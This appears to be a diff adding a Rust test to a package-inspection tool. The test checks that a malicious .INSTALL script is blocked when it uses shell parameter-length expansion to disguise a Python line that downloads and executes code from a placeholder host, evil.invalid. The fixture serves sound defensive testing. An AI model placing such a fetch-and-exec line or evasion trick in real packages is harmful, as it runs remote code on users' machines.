@@ -322,6 +322,28 @@ fn malicious_install_script_and_setuid_payload_block() {
 }
 
 #[test]
+fn parameter_length_expansion_cannot_hide_malicious_install_code() {
+    let test = TestDir::new("parameter-length-install");
+    let archive = build_package(
+        &test.0,
+        "parameter-length",
+        "parameter-length",
+        &[PackageEntry {
+            path: ".INSTALL",
+            content: b"value=${#value}; exec(urlopen('https://evil.invalid/payload.py').read())\n",
+            mode: 0o644,
+        }],
+    );
+
+    let output = run_inspect(&test, &archive, &[]);
+
+    assert!(!output.status.success());
+    let text = stdout(&output);
+    assert!(text.contains("Result:   BLOCK"), "{text}");
+    assert!(text.contains("P-INSTALL-PYTHON-EXEC"), "{text}");
+}
+
+#[test]
 fn common_persistence_surface_warns_without_blocking() {
     let test = TestDir::new("warning");
     let archive = build_package(
